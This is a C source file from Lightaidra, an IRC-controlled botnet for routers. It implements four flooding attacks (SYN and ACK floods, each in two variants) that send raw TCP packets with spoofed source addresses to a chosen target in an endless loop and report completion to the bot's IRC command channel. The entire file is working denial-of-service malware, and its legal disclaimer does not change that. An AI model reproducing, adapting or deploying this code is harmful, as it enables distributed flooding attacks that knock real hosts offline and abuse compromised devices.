/*
 * attacks.c - USE LIGHTAIDRA AT YOUR OWN RISK!
 *
 * Lightaidra - IRC-based mass router scanner/exploiter.
 * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
 *
 * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
 * all applicable local, state and federal laws. Developers assume 
 * no liability and are not responsible for any misuse or damage 
 * caused by this program.
 *
 */

#include "../include/headers.h"

unsigned int get_spoofed();
unsigned short in_cksum(unsigned short *ptr, int nbytes);
int sockwrite(int sd, const char *fmt, ...);


/* synflood(), ngsynflood(), ackflood(), ngackflood() */
/* these functions are adapted from ktx.c             */
void synflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int ntime) {
    int get;
    struct send_tcp send_tcp;
    struct pseudo_header pseudo_header;
    struct sockaddr_in sin;
    unsigned int syn[20] = { 2, 4, 5, 180, 4, 2, 8, 10, 0, 0, 0, 0, 0, 0, 0, 0, 1, 3, 3, 0 }, a = 0;
    unsigned int psize = 20, source, dest, check;
    unsigned long saddr, daddr, secs;
    time_t start = time(NULL);

    if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
        exit(EXIT_FAILURE); {
        int i;
        
        for (i = 0; i < 20; i++) {
            send_tcp.buf[i] = (u_char) syn[i];
        }
    }

    daddr = dest_addr;
    secs = ntime;

    send_tcp.ip.ihl = 5;
    send_tcp.ip.version = 4;
    send_tcp.ip.tos = 16;
    send_tcp.ip.frag_off = 64;
    send_tcp.ip.ttl = 64;
    send_tcp.ip.protocol = 6;
    send_tcp.tcp.ack_seq = 0;
    send_tcp.tcp.doff = 10;
    send_tcp.tcp.res1 = 0;
    send_tcp.tcp.cwr = 0;
    send_tcp.tcp.ece = 0;
    send_tcp.tcp.urg = 0;
    send_tcp.tcp.ack = 0;
    send_tcp.tcp.psh = 0;
    send_tcp.tcp.rst = 0;
    send_tcp.tcp.fin = 0;
    send_tcp.tcp.syn = 1;
    send_tcp.tcp.window = 30845;
    send_tcp.tcp.urg_ptr = 0;
    dest = htons(dest_port);

    while (1) {
        source = rand();
        if (dest_port == 0) dest = rand();
        
        if (srchost == 0) saddr = get_spoofed();
        else saddr = srchost;

        send_tcp.ip.tot_len = htons(40 + psize);
        send_tcp.ip.id = rand();
        send_tcp.ip.saddr = saddr;
        send_tcp.ip.daddr = daddr;
        send_tcp.ip.check = 0;
        send_tcp.tcp.source = source;
        send_tcp.tcp.dest = dest;
        send_tcp.tcp.seq = rand();
        send_tcp.tcp.check = 0;
        sin.sin_family = AF_INET;
        sin.sin_port = dest;
        sin.sin_addr.s_addr = send_tcp.ip.daddr;
        send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
        check = rand();
        send_tcp.buf[9] = ((char *)&check)[0];
        send_tcp.buf[10] = ((char *)&check)[1];
        send_tcp.buf[11] = ((char *)&check)[2];
        send_tcp.buf[12] = ((char *)&check)[3];
        pseudo_header.source_address = send_tcp.ip.saddr;
        pseudo_header.dest_address = send_tcp.ip.daddr;
        pseudo_header.placeholder = 0;
        pseudo_header.protocol = IPPROTO_TCP;
        pseudo_header.tcp_length = htons(20 + psize);
        bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
        bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
        send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32 + psize);
        sendto(get, &send_tcp, 40 + psize, 0, (struct sockaddr *)&sin, sizeof(sin));

        if (a >= 50) {
            if (time(NULL) >= start + secs) {
                sockwrite(sp->sockfd, "PRIVMSG %s :[nsynflood] packeting completed!\n", channel);
                close(get);
                sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
                exit(EXIT_SUCCESS);
            }

            a = 0;
        }

        a++;
    }

    close(get);
    sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
    exit(EXIT_FAILURE);
}

void ngsynflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int ntime) {
    int get;
    struct send_tcp send_tcp;
    struct pseudo_header pseudo_header;
    struct sockaddr_in sin;
    unsigned int syn[20] = { 2, 4, 5, 180, 4, 2, 8, 10, 0, 0, 0, 0, 0, 0, 0, 0, 1, 3, 3, 0 }, a = 0;
    unsigned int psize = 20, source, dest, check;
    unsigned long saddr, daddr, secs;
    time_t start = time(NULL);

    if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) 
        exit(EXIT_FAILURE); {
        int i;
        
        for (i = 0; i < 20; i++) {
            send_tcp.buf[i] = (u_char) syn[i];
        }
    }

    daddr = dest_addr;
    secs = ntime;

    send_tcp.ip.ihl = 5;
    send_tcp.ip.version = 4;
    send_tcp.ip.tos = 16;
    send_tcp.ip.frag_off = 64;
    send_tcp.ip.ttl = 64;
    send_tcp.ip.protocol = 6;
    send_tcp.tcp.ack_seq = 0;
    send_tcp.tcp.doff = 10;
    send_tcp.tcp.res1 = 0;
    send_tcp.tcp.cwr = 0;
    send_tcp.tcp.ece = 0;
    send_tcp.tcp.urg = 0;
    send_tcp.tcp.ack = 0;
    send_tcp.tcp.psh = 0;
    send_tcp.tcp.rst = 0;
    send_tcp.tcp.fin = 0;
    send_tcp.tcp.syn = 1;
    send_tcp.tcp.window = 30845;
    send_tcp.tcp.urg_ptr = 0;
    dest = htons(dest_port);

    while (1) {
        source = rand();
        if (dest_port == 0) dest = rand();

        if (srchost == 0) saddr = get_spoofed();
        else saddr = srchost;

        send_tcp.ip.tot_len = htons(40 + psize);
        send_tcp.ip.id = rand();
        send_tcp.ip.saddr = saddr;
        send_tcp.ip.daddr = daddr;
        send_tcp.ip.check = 0;
        send_tcp.tcp.source = source;
        send_tcp.tcp.dest = dest;
        send_tcp.tcp.seq = rand();
        send_tcp.tcp.check = 0;
        sin.sin_family = AF_INET;
        sin.sin_port = dest;
        sin.sin_addr.s_addr = send_tcp.ip.daddr;
        send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
        check = rand();
        send_tcp.buf[9] = ((char *)&check)[0];
        send_tcp.buf[10] = ((char *)&check)[1];
        send_tcp.buf[11] = ((char *)&check)[2];
        send_tcp.buf[12] = ((char *)&check)[3];
        pseudo_header.source_address = send_tcp.ip.saddr;
        pseudo_header.dest_address = send_tcp.ip.daddr;
        pseudo_header.placeholder = 0;
        pseudo_header.protocol = IPPROTO_TCP;
        pseudo_header.tcp_length = htons(20 + psize);
        bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
        bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
        send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32 + psize);
        sendto(get, &send_tcp, 40 + psize, 0, (struct sockaddr *)&sin, sizeof(sin));
    
        if (a >= 50) {
            if (time(NULL) >= start + secs) {
                sockwrite(sp->sockfd, "PRIVMSG %s :[ngsynflood] packeting completed!\n", channel);
                close(get);
                sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
                exit(EXIT_SUCCESS);
            }

            a = 0;
        }

        a++;
    }

    close(get);
    sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
    exit(EXIT_FAILURE);
}

void ackflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int ntime) {
    int get;
    struct send_tcp send_tcp;
    struct pseudo_header pseudo_header;
    struct sockaddr_in sin;
    unsigned int syn[20] = { 2, 4, 5, 180, 4, 2, 8, 10, 0, 0, 0, 0, 0, 0, 0, 0, 1, 3, 3, 0 }, a = 0;
    unsigned int psize = 20, source, dest, check;
    unsigned long saddr, daddr, secs;
    time_t start = time(NULL);

    if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
        exit(EXIT_FAILURE); {
        int i;
        for (i = 0; i < 20; i++)
            send_tcp.buf[i] = (u_char) syn[i];
    }

    daddr = dest_addr;
    secs = ntime;
    dest = htons(dest_port);

    send_tcp.ip.ihl = 5;
    send_tcp.ip.version = 4;
    send_tcp.ip.tos = 16;
    send_tcp.ip.frag_off = 64;
    send_tcp.ip.ttl = 255;
    send_tcp.ip.protocol = 6;
    send_tcp.tcp.doff = 5;
    send_tcp.tcp.res1 = 0;
    send_tcp.tcp.cwr = 0;
    send_tcp.tcp.ece = 0;
    send_tcp.tcp.urg = 0;
    send_tcp.tcp.ack = 1;
    send_tcp.tcp.psh = 1;
    send_tcp.tcp.rst = 0;
    send_tcp.tcp.fin = 0;
    send_tcp.tcp.syn = 0;
    send_tcp.tcp.window = 30845;
    send_tcp.tcp.urg_ptr = 0;

    while (1) {
        if (dest_port == 0) dest = rand();
        if (srchost == 0) saddr = get_spoofed();
        else saddr = srchost;

        send_tcp.ip.tot_len = htons(40 + psize);
        send_tcp.ip.id = rand();
        send_tcp.ip.check = 0;
        send_tcp.ip.saddr = saddr;
        send_tcp.ip.daddr = daddr;
        send_tcp.tcp.source = rand();
        send_tcp.tcp.dest = dest;
        send_tcp.tcp.seq = rand();
        send_tcp.tcp.ack_seq = rand();
        send_tcp.tcp.check = 0;
        sin.sin_family = AF_INET;
        sin.sin_port = send_tcp.tcp.dest;
        sin.sin_addr.s_addr = send_tcp.ip.daddr;
        send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
        check = in_cksum((unsigned short *)&send_tcp, 40);
        pseudo_header.source_address = send_tcp.ip.saddr;
        pseudo_header.dest_address = send_tcp.ip.daddr;
        pseudo_header.placeholder = 0;
        pseudo_header.protocol = IPPROTO_TCP;
        pseudo_header.tcp_length = htons(20 + psize);
        bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
        bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
        send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32 + psize);
        sendto(get, &send_tcp, 40 + psize, 0, (struct sockaddr *)&sin, sizeof(sin));

        if (a >= 50) {
            if (time(NULL) >= start + secs) {
                sockwrite(sp->sockfd, "PRIVMSG %s :[ackflood] packeting completed!\n", channel);
                close(get);
                sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
                exit(EXIT_SUCCESS);
            }

            a = 0;
        }

        a++;
    }

    close(get);
    sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");

    exit(EXIT_FAILURE);
}

void ngackflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int ntime) {
    int get;
    struct send_tcp send_tcp;
    struct pseudo_header pseudo_header;
    struct sockaddr_in sin;
    unsigned int syn[20] = { 2, 4, 5, 180, 4, 2, 8, 10, 0, 0, 0, 0, 0, 0, 0, 0, 1, 3, 3, 0 }, a = 0;
    unsigned int psize = 20, source, dest, check;
    unsigned long saddr, daddr, secs;
    time_t start = time(NULL);

    if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
        exit(EXIT_FAILURE); {
        int i;
        
        for (i = 0; i < 20; i++) {
            send_tcp.buf[i] = (u_char) syn[i];
        }
    }

    daddr = dest_addr;
    secs = ntime;
    dest = htons(dest_port);

    send_tcp.ip.ihl = 5;
    send_tcp.ip.version = 4;
    send_tcp.ip.tos = 16;
    send_tcp.ip.frag_off = 64;
    send_tcp.ip.ttl = 255;
    send_tcp.ip.protocol = 6;
    send_tcp.tcp.doff = 5;
    send_tcp.tcp.res1 = 0;
    send_tcp.tcp.cwr = 0;
    send_tcp.tcp.ece = 0;
    send_tcp.tcp.urg = 0;
    send_tcp.tcp.ack = 1;
    send_tcp.tcp.psh = 1;
    send_tcp.tcp.rst = 0;
    send_tcp.tcp.fin = 0;
    send_tcp.tcp.syn = 0;
    send_tcp.tcp.window = 30845;
    send_tcp.tcp.urg_ptr = 0;

    while (1) {
        if (dest_port == 0) dest = rand();

        if (srchost == 0) saddr = get_spoofed();
        else saddr = srchost;

        send_tcp.ip.tot_len = htons(40 + psize);
        send_tcp.ip.id = rand();
        send_tcp.ip.check = 0;
        send_tcp.ip.saddr = saddr;
        send_tcp.ip.daddr = daddr;
        send_tcp.tcp.source = rand();
        send_tcp.tcp.dest = dest;
        send_tcp.tcp.seq = rand();
        send_tcp.tcp.ack_seq = rand();
        send_tcp.tcp.check = 0;
        sin.sin_family = AF_INET;
        sin.sin_port = send_tcp.tcp.dest;
        sin.sin_addr.s_addr = send_tcp.ip.daddr;
        send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
        check = in_cksum((unsigned short *)&send_tcp, 40);
        pseudo_header.source_address = send_tcp.ip.saddr;
        pseudo_header.dest_address = send_tcp.ip.daddr;
        pseudo_header.placeholder = 0;
        pseudo_header.protocol = IPPROTO_TCP;
        pseudo_header.tcp_length = htons(20 + psize);
        bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
        bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
        send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32 + psize);
        sendto(get, &send_tcp, 40 + psize, 0, (struct sockaddr *)&sin, sizeof(sin));

        if (a >= 50) {
            if (time(NULL) >= start + secs) {
                sockwrite(sp->sockfd, "PRIVMSG %s :[ngackflood] packeting completed!\n", channel);
                close(get);
                sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
                exit(EXIT_SUCCESS);
            }

            a = 0;
        }
        
        a++;
    }

    close(get);
    sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");

    exit(EXIT_FAILURE);
}
